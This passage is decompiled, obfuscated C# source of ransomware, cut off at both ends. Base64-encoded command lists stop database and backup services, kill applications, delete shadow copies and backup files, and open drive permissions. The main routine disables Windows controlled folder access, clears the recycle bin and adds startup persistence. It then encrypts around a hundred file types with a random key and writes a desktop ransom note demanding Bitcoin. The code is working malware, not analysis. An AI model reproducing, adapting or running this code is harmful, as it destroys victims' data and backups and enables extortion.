		aOUUGKAtMbj("c3RvcCBUbUNDU0YgL3k="),
		aOUUGKAtMbj("c3RvcCBTUUxCcm93c2VyIC95"),
		aOUUGKAtMbj("c3RvcCB0bWxpc3RlbiAveQ=="),
		aOUUGKAtMbj("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		aOUUGKAtMbj("c3RvcCBUcnVlS2V5IC95"),
		aOUUGKAtMbj("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		aOUUGKAtMbj("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		aOUUGKAtMbj("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		aOUUGKAtMbj("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		aOUUGKAtMbj("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		aOUUGKAtMbj("c3RvcCBXUlNWQyAveQ=="),
		aOUUGKAtMbj("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		aOUUGKAtMbj("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> fYAGGdcwZIgs = new List<string>
	{
		aOUUGKAtMbj("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		aOUUGKAtMbj("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		aOUUGKAtMbj("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		aOUUGKAtMbj("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		aOUUGKAtMbj("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		aOUUGKAtMbj("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		aOUUGKAtMbj("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		aOUUGKAtMbj("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> jmWjqzKYeqJ = new List<string>
	{
		aOUUGKAtMbj("L0lNIG1zcHViLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIG15c3FsZC5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIGFnbnRzdmMuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIHRoZWJhdC5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIGVuY3N2Yy5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIENOVEFvU01nci5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIGRiZW5nNTAuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG9jb21tLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIHpvb2x6LmV4ZSAvRg=="),
		aOUUGKAtMbj("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIGRic25tcC5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIG1zcHViLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG9uZW5vdGUuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG91dGxvb2suZXhlIC9G"),
		aOUUGKAtMbj("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHZpc2lvLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIHdpbndvcmQuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHdvcmRwYWQuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIG9jc3NkLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIG9yYWNsZS5leGUgL0Y="),
		aOUUGKAtMbj("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		aOUUGKAtMbj("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		aOUUGKAtMbj("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> fzaAvBhjLkDq = new List<string>
	{
		aOUUGKAtMbj(jojTjVgCWQek("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		aOUUGKAtMbj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		aOUUGKAtMbj(jojTjVgCWQek("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string edsqPeUtqjjJV = aOUUGKAtMbj("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> mcLlyCYytyHySi = new List<string>
	{
		aOUUGKAtMbj("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		aOUUGKAtMbj("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		aOUUGKAtMbj("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		aOUUGKAtMbj("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		aOUUGKAtMbj("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		aOUUGKAtMbj("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> fiAOYJBKABPnBdAi = new List<string>
	{
		aOUUGKAtMbj("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		aOUUGKAtMbj("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		aOUUGKAtMbj("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string cNpczrBfYMi = "NO";

	public static string wygEehukJHgR = "NO";

	internal static DateTime MtiKkbUhDUh = new DateTime(2000, 1, 1);

	internal static DateTime fpldDPXZOsCn = new DateTime(2100, 1, 1);

	public static string mWVhKlhRjNKlia = "YES";

	public static string QwggfFbICMPoft = "10";

	public static string simvqYxVEzlY = "NO";

	public static string OsSGeJoAplzQ = "NO";

	public static string ASjzHcHgiwYvm = "NO";

	public static string decdRAwOyMU = "YES";

	public static string snADVPumagGU = "NO";

	public static string VjQPfxZAMTjUgJ = "NO";

	public static List<string> GkngOkBVtwXA = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string kcuNJebGcjkOW = "NO";

	public static string HbtHzSSIxwCpn = "1";

	public static string kSofTmFgWFZs = "NO";

	public static string QWTWQioUpGXBKGGIbO = "NO";

	public static string UzfaFuuUlsXB = "NO";

	public static string VJaXDrBeQfRs = string.Empty;

	public static string tvJeuUDuLieh = "NO";

	public static string xPdxtgEIagxQ = "NO";

	public static string SrfPZgIrTbGbWT = "NO";

	public static string nuuqjvaQOVpt = "";

	public static string IHBtQGHlCK = "";

	public static string RBLIEEfyFcCfseo = "NO";

	public static string feHcyXFewLXAX = "NO";

	public static string VdUyrckhXSQ = "YES";

	public static string qjOjoItzPVjNHyk = "NO";

	public static string AOFibWXLvD = "NO";

	public static string RqkkSlQSIBssx = "LOGONISOFF";

	public static string BPYrTLQlffF = "NO";

	public static string HGYBMMPaJHFpDFI = "NO";

	public static string eYxPrbivOxVq = "mystartup.lnk";

	public static string SDjTTRoBMQV = "NO";

	public static string htdFHZmDIqTYdhs = "NO";

	public static string rcWeiKQuaNvmbTJ = "NO";

	public static string ZJqmWEStsNAIo = "NO";

	public static string MUQqnnxefeYQYg = "VGhhbm9z";

	public static string OIwfdyFzNcJc = "YES";

	public static string vcFnlphaWZwF = "YES";

	public static string UZHyxLIlKGCa = "NO";

	public static string hExZUxcEhGVWj = "NO";

	public static string[] MSrTCzMRlwKyFZcwa = new string[0];

	public static string loBrWClZEFFu = "NO";

	public static bool GtQHtyUYTAIYOR = true;

	public static string iGPaRzVoNpK = "NO";

	public static bool cqwcNhPdCH = true;

	public static bool jAvPzSgRVvMGhvN = false;

	public static bool wAPMGntMBhaZCeB = false;

	public static bool TmHfkYcJttrgO = false;

	public static string agUGmZJGeSw = "Debug_Log.txt";

	public static bool NZZJwvuCaIyu = false;

	public static bool hsBuExTBPOYZ = true;

	public static bool QxuQeaCANFsFOk = false;

	public static bool pKzqlEujtGte = false;

	public static bool xetcGCQIRoI = true;

	public static string vTRFYbEeAJOls = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + dfEhXlxbLTgTMeE.UlxMqsudHxxdMYr() + ".txt";

	public static bool WXNHDtRjOR = true;

	public static Stopwatch WnKvTcsQHPkFh = new Stopwatch();

	public static int kAIRALERmvGYRk = 0;

	public static int RGcMmldgjxiBCQ = 0;

	public static bool BSFTTffCPqVFY = false;

	public static string XOTrqnPLqah = ".[ID-" + dfEhXlxbLTgTMeE.UlxMqsudHxxdMYr() + "]";

	public static string[] smZqTKofevbrU = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> DxMoLxLLJwKb = new List<string>();

	public static int LjBQpNbJmTqCj = 0;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	private static void Main(string[] args)
	{
		try
		{
			yYibUCwpbDDsSQW CS_0024_003C_003E8__locals0 = new yYibUCwpbDDsSQW();
			CS_0024_003C_003E8__locals0.sNihvifarw = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.sNihvifarw) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			uWoULRDWAkcWG.NQeuneBYnVyyFpF(AKqrsfrSqJNRuqOe);
		}
		catch (Exception)
		{
		}
		try
		{
			if (OIwfdyFzNcJc == "YES")
			{
				Thread thread = new Thread(jGRkJVPAmVRM.HcTXqhLkIgC);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (fUGymAXMXqWznU == "YES")
		{
			Thread.Sleep(int.Parse(kWKaziRMlqancV));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && snADVPumagGU == "YES")
		{
			try
			{
				YHrTJmrzht(aOUUGKAtMbj("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (TpQhoOUQHQNz == "YES" && RGQWumbafJmjj.JQkqyZHySMTaLXH())
			{
				new vcmdlkNQFdyWsk().eIpPxhMbeGsMBm(bool_0: false);
				RGQWumbafJmjj.UqVixNKCyUOt();
			}
		}
		catch (Exception)
		{
		}
		if (JYMTOHHYQMWcsTq == "YES" && RGQWumbafJmjj.JQkqyZHySMTaLXH())
		{
			new vcmdlkNQFdyWsk().eIpPxhMbeGsMBm(bool_0: false);
			new vcmdlkNQFdyWsk().etOeIuDqomYp();
		}
		if (VdaFaacZSHzW == "YES")
		{
			tEubHtmNUK.kBWxeYmivRCS();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (mlasDSpOAZlt == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(NijZAIeuREoBa);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (anBOuYMAayo == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					bWiIkBWdECaZqt = RmbfckpOKrQ(0, xDXDIfSaTNqbmVZ.Count);
					File.Copy(fileName, text + xDXDIfSaTNqbmVZ[bWiIkBWdECaZqt], overwrite: true);
					Process.Start(text + xDXDIfSaTNqbmVZ[bWiIkBWdECaZqt]);
					VhbbmAnvAWgpo();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (cNpczrBfYMi == "YES" && DateTime.Now < MtiKkbUhDUh)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (wygEehukJHgR == "YES" && DateTime.Now > fpldDPXZOsCn)
			{
				VhbbmAnvAWgpo();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = "This console window will close by itself. DON'T CLOSE IT MANUALLY OR THE WHOLE PROCESS WILL TERMINATE!";
			if (feHcyXFewLXAX == "YES")
			{
				Console.WriteLine("Network scanning in process...");
			}
			WnKvTcsQHPkFh.Start();
		}
		catch
		{
		}
		MwiKdCIyCDjKms();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = fYAGGdcwZIgs;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						BYWGmjrQxPOi(aOUUGKAtMbj("c2MuZXhl"), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source2 = jmWjqzKYeqJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (hExZUxcEhGVWj == "YES")
				{
					string[] mSrTCzMRlwKyFZcwa = MSrTCzMRlwKyFZcwa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
						};
					}
					Parallel.ForEach(mSrTCzMRlwKyFZcwa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!bZzwXTgSpki().Contains("XP"))
				{
					wnSUIUdJHSWSo(edsqPeUtqjjJV);
				}
				else
				{
					List<string> source3 = fzaAvBhjLkDq;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							BYWGmjrQxPOi(aOUUGKAtMbj(jojTjVgCWQek("lhXZu4WatRWYzNnd")), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source4 = mcLlyCYytyHySi;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						BYWGmjrQxPOi(aOUUGKAtMbj("ZGVsLmV4ZQ=="), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (feHcyXFewLXAX == "NO")
		{
			yULfUxZlvFs();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && wAPMGntMBhaZCeB)
			{
				try
				{
					Thread thread4 = new Thread(MxetgwXpokRilIg.HXbKiyzTKmm);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			BYWGmjrQxPOi("cmd.exe", aOUUGKAtMbj("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		SecureString secureString = new SecureString();
		if (simvqYxVEzlY == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			zVjVWQkqZc = "MYXRW99YGQ48K61P2QZ4UZ6XIDDVWLI3";
		}
		mHNJOupRlfk = LBIBcyVRyJsgY.EMWORkdaaqST(TDDqpUYLupEmTn(secureString));
		if (QxuQeaCANFsFOk)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), vTRFYbEeAJOls)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), vTRFYbEeAJOls), string.Concat(aOUUGKAtMbj("Q2xpZW50IElQOiA="), new WebClient().DownloadString(aOUUGKAtMbj("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", aOUUGKAtMbj("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", aOUUGKAtMbj("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), mHNJOupRlfk));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), vTRFYbEeAJOls), "\r\nAdditional KeyID: " + mHNJOupRlfk);
				}
			}
			catch (Exception ex7)
			{
				if (NZZJwvuCaIyu)
				{
					try
					{
						File.AppendAllText(agUGmZJGeSw, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		XdQyiXfDNPsvZ.ehZRKgQLWZe(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), eYxPrbivOxVq), SxpNgXjLkDEXwMm(mHNJOupRlfk), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			OnlrpoKezgfqtr();
		}
		try
		{
			try
			{
				if (WXNHDtRjOR)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			gbggMvBfPLB(new string[1] { "[auto]" }, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, new string[0], TDDqpUYLupEmTn(secureString), ".xlat7j");
		}
		catch (Exception ex9)
		{
			if (NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(agUGmZJGeSw, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(aOUUGKAtMbj("QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCBkdWUgdG8gYSBzZWN1cml0eSBwcm9ibGVtIHdpdGggeW91ciBQQy4gSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtLCB3cml0ZSB1cyB0byB0aGUgZS1tYWlsIFRpYmVyaWFub0Bhb2wuY29tDQpZb3UgaGF2ZSB0byBwYXkgZm9yIGRlY3J5cHRpb24gaW4gQml0Y29pbnMuIFRoZSBwcmljZSBkZXBlbmRzIG9uIGhvdyBmYXN0IHlvdSB3cml0ZSB0byB1cy4gQWZ0ZXIgcGF5bWVudCB3ZSB3aWxsIHNlbmQgeW91IHRoZSB0b29sIHRoYXQgd2lsbCBkZWNyeXB0IGFsbCB5b3VyIGZpbGVzLiANCkZyZWUgZGVjcnlwdGlvbiBhcyBndWFyYW50ZWUNCkJlZm9yZSBwYXlpbmcgeW91IGNhbiBzZW5kIHVzIHVwIHRvIDUgZmlsZXMgZm9yIGZyZWUgZGVjcnlwdGlvbi4gVGhlIHRvdGFsIHNpemUgb2YgZmlsZXMgbXVzdCBiZSBsZXNzIHRoYW4gNE1iIChub24gYXJjaGl2ZWQpLCBhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLGJhY2t1cHMsIGxhcmdlIGV4Y2VsIHNoZWV0cywgZXRjLikgDQpIb3cgdG8gb2J0YWluIEJpdGNvaW5zDQpUaGUgZWFzaWVzdCB3YXkgdG8gYnV5IGJpdGNvaW5zIGlzIExvY2FsQml0Y29pbnMgc2l0ZS4gWW91IGhhdmUgdG8gcmVnaXN0ZXIsIGNsaWNrICdCdXkgYml0Y29pbnMnLCBhbmQgc2VsZWN0IHRoZSBzZWxsZXIgYnkgcGF5bWVudCBtZXRob2QgYW5kIHByaWNlLiANCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zIA0KQWxzbyB5b3UgY2FuIGZpbmQgb3RoZXIgcGxhY2VzIHRvIGJ1eSBCaXRjb2lucyBhbmQgYmVnaW5uZXJzIGd1aWRlIGhlcmU6IA0KaHR0cDovL3d3dy5jb2luZGVzay5jb20vaW5mb3JtYXRpb24vaG93LWNhbi1pLWJ1eS1iaXRjb2lucy8gDQpBdHRlbnRpb24hDQpEbyBub3QgcmVuYW1lIGVuY3J5cHRlZCBmaWxlcy4gDQpEbyBub3QgdHJ5IHRvIGRlY3J5cHQgeW91ciBkYXRhIHVzaW5nIHRoaXJkIHBhcnR5IHNvZnR3YXJlLCBpdCBtYXkgY2F1c2UgcGVybWFuZW50IGRhdGEgbG9zcy4gDQpEZWNyeXB0aW9uIG9mIHlvdXIgZmlsZXMgd2l0aCB0aGUgaGVscCBvZiB0aGlyZCBwYXJ0aWVzIG1heSBjYXVzZSBpbmNyZWFzZWQgcHJpY2UgKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXIpIG9yIHlvdSBjYW4gYmVjb21lIGEgdmljdGltIG9mIGEgc2NhbS4g"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(aOUUGKAtMbj("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(mHNJOupRlfk);
				if (UimcEmUUufACwj == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(aOUUGKAtMbj("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(RQEvWqwCwPPGRO.Count));
				}
				if (BSFTTffCPqVFY)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(aOUUGKAtMbj("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(dfEhXlxbLTgTMeE.UlxMqsudHxxdMYr());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
